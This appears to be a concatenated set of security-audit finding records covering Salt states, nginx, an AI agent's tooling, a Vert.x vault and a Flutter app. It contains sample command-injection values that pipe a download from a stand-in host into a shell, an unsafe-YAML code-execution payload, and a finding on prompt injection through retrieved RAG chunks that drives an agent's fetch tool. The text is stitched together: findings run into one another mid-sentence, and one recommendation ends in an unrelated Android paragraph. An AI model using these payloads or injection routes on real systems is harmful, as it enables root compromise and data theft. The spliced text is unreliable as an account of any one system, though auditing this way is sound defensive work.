findings.evidence: pillar/fleet.sls:20-22 documents the source: 'Mirrored out of the CMDB asset record by the nightly pillar sync, so it changes whenever someone edits the rack entry in the asset browser' -> extra_labels: "owner=platform-eng tier=edge". salt/telemetry/init.sls:2 {% set labels = telemetry.get('extra_labels', '') %}; L33-38 cmd.run: - name: >- /usr/bin/telemetry-agent register --bucket ... --label rack=... {{ labels }}. The value is spliced raw into a string that Salt hands to a shell. A label value of `x; curl http://host/s | sh` ends the register command and starts another. The value is deliberately unquoted so it word-splits into several --label arguments, so quoting it is not the fix.
findings.impact: Whoever can edit that asset record in the CMDB - a wider and less audited population than the pillar repo's committers - obtains arbitrary root command execution on every node carrying roles:edge-proxy or roles:collector, on the next highstate where telemetry-config changes. Preconditions: write access to the asset browser field, and the nightly sync running.
findings.recommendation: Stop building the command as text. Pass the labels as a list to cmd.run (- name: ['/usr/bin/telemetry-agent','register','--bucket',bucket,...] with python_shell: False), splitting extra_labels in Jinja into individual --label arguments, and validate each against ^[A-Za-z0-9_.-]+=[A-Za-z0-9_.-]+$ before emitting it.

triage.reason: No validation exists between the pillar read (L2) and the sink (L38); the tree contains no allowlist, no shlex-style quoting and no Jinja filter on this value.

The file states the value is machine-synced from an external asset browser rather than authored in the pillar repo. That statement is audited content, not proof - hence status probable - but the construct applies no neutralisation regardless of origin.
Salt's cmd.run defaults to python_shell=True, and the state relies on shell word-splitting for this very value, so the sink is a shell.
The construct applies wherever the telemetry state applies (salt/top.sls:5-11, two role classes), not to a single node.

scope.established_by: salt/top.sls:5-11 (telemetry applied to roles:edge-proxy and roles:collector)
scope.narrowed_by: the onchanges: file: telemetry-config requisite at L39-40 means the command fires only when /etc/telemetry/agent.yaml changes, not on every run

searched.for: any sanitisation, quoting or allowlist between the pillar read and the cmd.run
searched.found: nothing

searched.found: nothing - only the comment naming the CMDB as the writer

findings.title: Minion-controlled grain rack_id interpolated into the same root cmd.run
findings.evidence: salt/telemetry/init.sls:3 {% set rack = salt['grains.get']('rack_id', '0') %} -> L37 --label rack={{ rack }} inside the shell string of telemetry-register-node. Grains are supplied by the minion; nothing in this tree defines rack_id (grep over the whole tree: the only occurrence is this read), so its provenance is a node-local file (/etc/salt/grains, /etc/salt/minion.d/*) or an unshipped custom grain module - a name read with a fallback that nothing in the project defines.
findings.impact: A node that can influence its own grain configuration turns the next telemetry convergence into arbitrary root command execution on itself - a persistence and privilege-escalation primitive that survives re-convergence because the master re-injects it, and one that is invisible in the state tree. Preconditions: write access to the minion's grain source without being root (an imaging/bootstrap process, a grain derived from DMI/DHCP data, or a partially compromised node).
findings.recommendation: Same root fix as the labels: build the command as an argument list with python_shell: False. If rack must come from a grain, validate it in Jinja or, better, source it from pillar where the master owns the value.

triage.reason: No validation between the grains.get at L3 and the sink at L37.
Grains are reported by the minion; the master renders whatever the node claims. The default '0' applies only when the node claims nothing.

A second principal exists: the state runs as root while the grain can be written by a non-root provisioning path, and the users state (salt/users/init.sls:8-18) puts unprivileged interactive accounts on the same host.
The consequence is root command execution, not a defence-in-depth gap.

scope.narrowed_by: the onchanges requisite at L39-40

findings.title: fleetctl.drain builds a shell command by concatenating node_id with shell=True
findings.evidence: L46-53 cmd = AGENT_BIN + " drain --node " + node_id + " --wait " + str(int(wait_seconds)) + " | tee -a /var/log/fleet/drain.log"; L55-57 subprocess.run(cmd, shell=True, ...). wait_seconds is coerced with int(); node_id is not touched. The neighbouring rotate_key (L62-74) validates the same parameter against NODE_RE (L20) and passes an argument list - the module already contains the correct pattern and drain does not use it. Execution modules run as root on the minion, and the module docstring (L3-4) states it is callable 'from an sls file, the CLI or a reactor'.
findings.impact: Any caller that reaches fleetctl.drain with a controlled node_id executes arbitrary commands as root on the target minion - node1; curl http://x/s|sh. The characteristic escalation is an eauth/salt-api ACL or a reactor that grants a limited operator or an automation only fleetctl.drain: that scoped permission becomes full root on the fleet.
findings.recommendation: Use the argument-list form as rotate_key does - subprocess.run([AGENT_BIN,'drain','--node',node_id,'--wait',str(int(wait_seconds))], ...) - and apply the existing NODE_RE check to node_id before running. If the tee is needed, write the captured stdout to the log file from Python instead of through a shell pipeline.

No caller exists in this tree (grep for 'drain' returns only the definition and the comment at salt/users/init.sls:20), so the origin of node_id cannot be traced backwards from here. This is the link that keeps the finding at probable.
shell=True at line 56 makes the sink /bin/sh, and the string already contains a pipeline.
The module is in salt/_modules/ and ships with the state tree; saltutil.sync_modules distributes it to every minion. It is not test or debug code.

findings.title: fleetctl.manifest parses a network response with yaml.Loader, the unsafe loader
findings.evidence: L31-41: def manifest(url=None) -> url = url or _pillar('fleet:manifest_url') -> resp = requests.get(url, timeout=20) -> return yaml.load(resp.text, Loader=yaml.Loader). yaml.Loader is PyYAML's unsafe constructor set: a document containing !!python/object/apply:os.system ['...'] is executed during parsing. Two entry points: the url parameter is caller-supplied and defaults only when omitted, and the default URL's response body is trusted verbatim.
findings.impact: Arbitrary code execution as root on the minion that parses the manifest. Reached either by a caller passing url=http://attacker/manifest.yaml (the module is documented as callable from the CLI, an sls or a reactor) or by anyone who can control the response from fleet.internal.example. The same parameter is a server-side request forgery primitive: the minion will fetch any URL, including link-local metadata endpoints, and return the parsed body to the caller.
findings.recommendation: yaml.safe_load(resp.text) - the manifest is described as key/value data with pins and flags, none of which needs Python object construction. If arbitrary caller URLs are not a feature, drop the url parameter and read the pillar value only.

triage.reason: The parsed text is an HTTP response body and the URL is a caller parameter; neither is a literal or an allowlisted value.
yaml.Loader (not SafeLoader, not FullLoader) is precisely the loader that constructs arbitrary Python objects; the sink executes rather than parses.
No schema validation, no signature check and no allowlist on url anywhere in the module; requests.get at L38 has no pinning.
The module ships in the state tree and is synced to every minion.

scope.established_by: salt/_modules/fleetctl.py:3-4 - synced on saltutil.sync_modules and callable fleet-wide

searched.for: a safe loader used elsewhere, or manifest signature verification
searched.found: nothing

searched.for: how manifest_url is set
searched.found: https://fleet.internal.example/manifests/edge.yaml - TLS on the default path, which bounds the passive attacker but not the url parameter nor a compromised manifest host

findings.what_would_settle_it: Who can invoke fleetctl.manifest with a url argument (eauth ACL, reactor, any sls - none present in scope), and whether the manifest host's content is authored by a smaller principal set than the state tree itself.

findings.title: enrollment._post_enroll_hook passes concatenated operator input to os.system
findings.evidence: L20-22 def _post_enroll_hook(script, node_id): return os.system(script + " " + node_id). Called at L41 as _post_enroll_hook(hook, name) where hook is the state's hook= argument and name is the state's name/id. Both halves of the command line are unneutralised, os.system always goes through /bin/sh, and state modules execute as root on the minion.

The module docstring (L3-5) claims nothing calls into it any more, which is true of this tree but does not remove it: _states/ is synced to every minion and the function is reachable through any sls or a state.single enrollment.present name=... hook=...

os.system is a shell sink by definition.
The function runs as root while the values are supplied by whoever authors or triggers the state - a different principal from root on the node.

findings.title: Control-plane bearer token written world-readable at /etc/fleet/agent.token
findings.evidence: salt/webproxy/init.sls:10-17 writes /etc/fleet/agent.token with - contents: {{ fleet['agent_token'] }}, user: root, group: root, mode: '0644'. The value is the credential used at salt/_modules/fleetctl.py:80-85 as headers={'Authorization': 'Bearer ' + str(token)} against fleet:enroll_endpoint. The comment at L8-9 gives the reason - three services 'each of which runs under its own service account' - which argues for a shared group, not for world-read. Two aggravating details in the same block: the secret is passed through contents:, so it is rendered into the state and lands in the master job cache and in any debug-level minion log; and pillar/fleet.sls:10 mints it with {{ salt["random.get_str"](40) }} at pillar-render time, so the file is rewritten with a fresh value on every refresh and no record of it exists anywhere.
findings.impact: Every local account on an edge node - the three interactive fleetops users created by salt/users/init.sls:8-18, the nginx worker, any service account, any process that achieves unprivileged code execution through the proxy - reads the control-plane bearer token. It converts any unprivileged foothold on an edge node into an authenticated caller of the fleet enrollment API. Precondition: any local read access, no privileges needed.
findings.recommendation: Set mode: '0640' with a dedicated group (group: fleet) that the three service accounts join, and deliver the value with - contents_pillar: fleet:agent_token instead of contents: so it is not rendered into the state text. Provision the token from the GPG-rendered pillar that pillar/fleet.sls:1-2 already describes, rather than generating it at render time.

A second principal is present on the same host by construction: salt/users/init.sls:8-18 creates three interactive accounts with /bin/bash on every node, and the webproxy comment names three distinct service accounts.
The data is a bearer credential; fleetctl.py:85 sends it as an Authorization header.
This is not a defence-in-depth gap: the permission is the only thing standing between a local unprivileged reader and the credential.

findings.title: State and pillar assignment keyed on minion-controlled grains (roles)
findings.class: Security decision based on untrusted input
findings.evidence: pillar/top.sls:5-7 and salt/top.sls:5-11 select targets with 'roles:edge-proxy' / 'roles:collector' plus - match: grain. findings.title: Proxied API traffic leaves the edge node in cleartext to a port declared as TLS
findings.evidence: nginx.conf.jinja:9-12 defines upstream app_backend { server {{ upstream_host }}:{{ upstream_port }} ... } with upstream_port = 8443 (pillar/fleet.sls:27), the conventional HTTPS-alternate port. Both consumers dial it in the clear: L32 proxy_pass http://app_backend; for /api/ and L46 the same for /admin/. The TLS terminated at L15-20 covers only the client-to-edge leg; nothing in the file or in the webproxy state configures proxy_ssl_* or a certificate for the upstream leg.
findings.impact: Either the backend speaks plaintext on 8443, in which case every proxied API and admin request - Authorization headers, session cookies, the operator console traffic - crosses the network between the edge node and app-blue.internal.example unencrypted and available to anyone on that path; or the backend speaks TLS on 8443 and the proxy is simply broken. The first reading is the security finding and the port number is the reason to suspect the second.
findings.recommendation: Decide explicitly: if the backend is TLS, use proxy_pass https://app_backend; with proxy_ssl_verify on, proxy_ssl_trusted_certificate and proxy_ssl_name; if it is plaintext, move it to a port that says so and document the transport.

triage.reason: An mTLS mesh or an encrypted overlay between the edge and app-blue would compensate; nothing in scope declares one and per FP-08 absence is not HOLDS.
Nothing in the tree declares the upstream leg as an accepted cleartext path; the comment at L3-4 only describes the inbound side.
The /admin/ console and the /api/ endpoints carry credentials and session material by construction - the /api/ block sets Access-Control-Allow-Credentials true at L38.
The benign reading would be that 8443 is a plaintext port by local convention; the pillar gives no evidence either way.

findings.title: http_fetch takes any URL; the host allowlist is wired only to a tool that is not enabled
findings.evidence: tools.py:33-42 http_fetch builds httpx.Client(timeout=..., follow_redirects=True) and GETs url with no check. guardrails.allowed_host (guardrails.py:49-54) is correct but is called at exactly one site, tools.py:69, inside probe_status - and probe_status is absent from tools.enabled (config.yaml:33-36), so ToolBox.registry() (tools.py:79-87) filters it out. findings.impact: The lethal trifecta closes on one agent: private data (runbook corpus, Postgres, model registry), untrusted ingestion (ticket bodies and retrieved chunks), and an outbound channel whose destination the model chooses. findings.title: Retrieved runbook chunks are interpolated into the system prompt with no delimitation, provenance mark or scrubbing
findings.class: Indirect prompt injection via RAG corpus
findings.evidence: render_context (prompts.py:32-44) formats each row as ### {title} ({source_url})\n{text} and build_system (prompts.py:49) drops the joined block into SYSTEM_TEMPLATE at prompts.py:17, between the house rules and the operator note - same textual plane, no fence, no marker distinguishing data from instruction. A chunk containing its own '### House rules' block, or a line reading CALL http_fetch {...} that the model echoes, is executed by the dispatcher with the gateway's credentials. This is the ingestion leg of the trifecta and it needs no API key at all, only the ability to type a resolution note.

findings.evidence: `root.route().handler(BodyHandler.create().setBodyLimit(config.getJsonObject("blobs").getLong("maxUploadBytes", 268435456L)))` at lines 62-63, resolving to 256 MB from config.json:16. The handler is registered on root.route() with no path or method restriction, and before every route including the unauthenticated ones at lines 65-71 and the auth handler at line 74 - so the body is fully buffered before any authentication decision. Downstream amplification is unbounded: MainVerticle.java:149 converts the buffer to a Java String (UTF-16, up to ~512 MB heap) and ManifestParser.java:32 builds a full DOM from it, and the element loop at 42-48 iterates nodes.getLength() with no cap. [Lead correction: returned as confirmed while answering FP-08 UNKNOWN; the triage invariant forbids that combination, so the status is lowered to probable. The code facts are unchanged.]
findings.impact: An unauthenticated caller forces the process to allocate up to 256 MB per concurrent request simply by POSTing a large body to any path - the body is buffered before routing decides the request is a 404. A small number of concurrent requests exhausts the heap. Authenticated callers get the amplified version through /v1/manifests. Note additionally that BodyHandler.create() enables file-upload handling with deleteUploadedFilesOnEnd defaulting to false, so multipart bodies are written to the upload directory and not removed - an unauthenticated disk-fill primitive on the same line.
findings.recommendation: Move BodyHandler off the root router and register it only on the routes that consume a body, after the auth handler. Set the limit to what a manifest actually needs - a few megabytes, not 256 - and separate it from blobs.maxUploadBytes, a different quantity that happens to share the config key. Disable upload handling with BodyHandler.create(false) since no route consumes multipart, and cap the manifest element count.

The allocation size is driven by the Content-Length and body the caller sends, bounded only by the 256 MB ceiling; the element count driving the JsonArray comes from the body with no bound at all.
A 256 MB limit on a JSON/XML metadata API is not a bounded intended exposure; the value appears copied from the blob-upload budget and applied to every route including ones that consume no body.

An ingress proxy could impose a smaller body limit ahead of the service, but no deployment manifest, ingress configuration or proxy config exists in the component and none was provided. This caps confidence on the exact exploitable size, not on the misordering, which is visible in the source.

scope.narrowed_by: The amplified DOM path is authenticated. The raw 256 MB buffering is not - it applies to unauthenticated requests to /healthz, /v1/health/config, /v1/blobs and /v1/presets/:name, and to unmatched paths, since BodyHandler runs before routing resolves the 404.

findings.title: Retention audit trail is destroyed by the cascade the moment it is written
findings.evidence: V1__init.sql:21 declares `document_id BIGINT REFERENCES vault.documents (id) ON DELETE CASCADE`. The third statement removes the parent row, and the cascade removes the audit_events row inserted by the second. Every expiry audit record is deleted microseconds after it is created, by design of the schema.
findings.impact: vault.audit_events is permanently empty for the 'expired' action - the retention job appears to write an audit trail and provably retains none of it. For a records-management vault operating a 2555-day retention window on an EU cold archive, there is no record of which documents were destroyed, when, or whether the destruction was correct. Any deletion an attacker induces is indistinguishable from routine expiry.
findings.recommendation: The audit table must outlive the rows it describes. Drop the foreign key or change it to ON DELETE SET NULL, and denormalise the identifying fields the audit needs (blob_key, owner_id, title) into audit_events. Revoke DELETE on vault.audit_events from both roles so the trail is append-only. Add a test asserting a row survives in audit_events after a sweep.

findings.title: PostgreSQL connection options omit sslMode, so the client negotiates no TLS
findings.evidence: Lines 45-52 construct PgConnectOptions setting exactly five properties - setHost, setPort, setDatabase, setUser, setPassword - and no TLS configuration: no setSslMode, no setSsl, no setTrustOptions, no setHostnameVerificationAlgorithm. Vert.x PgConnectOptions defaults sslMode to DISABLE, so the client sends no SSLRequest and the session proceeds in cleartext. The peer is a remote host: config.json:7 gives host pg-vault.internal.example on port 5432. config.json's db block contains no ssl key either, and bootstrap never reads one.
findings.impact: The database password is exchanged in the clear at connection time, and every row the vault reads or writes crosses the network unencrypted - including owner_email, which RetentionSweeper selects at line 42, and the titles and blob keys of every archived document. Anyone positioned on the path reads the archive catalogue and captures the credential.
findings.recommendation: Set .setSslMode(SslMode.VERIFY_FULL) with the CA trust options for the internal PKI, so the client both encrypts and verifies the server identity. VERIFY_FULL rather than REQUIRE, since REQUIRE encrypts without authenticating the peer. Drive it from a config key so non-production environments differ explicitly rather than by omission.

triage.reason: This is a missing-protection finding, not an injection: there is no attacker-supplied value whose origin would exculpate it.
A network boundary is crossed. config.json:7 names a remote DNS host, not localhost or a unix socket, so the session traverses infrastructure between two machines.

A service mesh or sidecar could tunnel the connection transparently, which would make the cleartext client setting harmless in practice. No deployment manifest, mesh configuration or network policy exists in the component and none was provided, so this ships as probable. What would settle it: the deployment descriptor for the vault workload and the network policy for its namespace.

findings.title: Retention sweep failures are silently discarded, and one failing document aborts every remaining document in the batch
findings.class: Improper check for unusual or exceptional conditions
findings.evidence: Two compounding defects. (1) `vertx.setPeriodic(periodMillis, timer -> sweep())` at line 38 - setPeriodic takes a Handler<Long> returning void, so the Future<Integer> that sweep() returns is discarded, and no onFailure or onComplete is attached anywhere. Any failure of the sweep is invisible. (2) expire (lines 50-77) accumulates all documents onto a single sequential chain: each iteration does chain = chain.compose(...) for delete, insert and delete. Future.compose propagates failure without invoking the mapper, so the first document whose blob delete at line 62 fails short-circuits every subsequent document in the batch of up to 500. There is also no transaction around the insert at 64 and the delete at 69.
findings.impact: The retention control fails silently and in bulk. A single blob whose file is already absent makes vertx.fileSystem().delete() fail, aborting the remaining documents in that sweep, and because the delete precedes the DB row removal the position is not advanced either, so the same failing document heads the next sweep an hour later and blocks it again. Retention deletion stops indefinitely with no log line, no metric and no alert, in a system whose whole purpose is enforcing a 7-year disposal schedule.
findings.recommendation: Attach a failure handler at line 38 so the job cannot fail invisibly, and export a success/failure metric. Isolate documents from one another with Future.join or a per-document recover so one failure does not abort the batch. In the other branch - the identifier is written by code outside this component - the key is derived from a value that lives in plaintext SharedPreferences, so an attacker who can read the sealed blob can read the identifier from the same directory and rederive the key. The finding holds either way; only its blast radius changes.
findings.recommendation: Do not derive the key from an identifier at all. Generate a key in the Android Keystore with setUserAuthenticationRequired(true), non-exportable, and use it to wrap the PIN - or stop storing the PIN and store only a salted, memory-hard hash if a local comparison is needed. If a passphrase-derived key is kept, use a real KDF with a per-install random salt stored beside the ciphertext.

triage.reason: Inverted for this class and still failing: the key material must be outside the attacker's reach and it is not. _keySalt is a literal and installationId is either the literal 'unknown' or a value stored in cleartext prefs.

lib/util/crypto.dart is production source with no build-variant guard, no debug flag and no test marker. The absence of a caller for savePin inside this 9-file slice is not evidence of removal from the build - Session is constructed in main() and passed to both screens.

The Keystore-backed FlutterSecureStorage does protect the ciphertext at rest, but it is not a control on this defect: it is the layer this key was meant to defend behind, and the PIN it wraps is the only thing the key protects.

scope.narrowed_by: Only the PIN is sealed by this key in this component; the tokens do not pass through SecureBox.

searched.found: one reader (session.dart:26) and no writer; the three setString calls are all in saveTokens

searched.found: a single sha256 over a literal salt joined to the identifier - no KDF and no platform key store
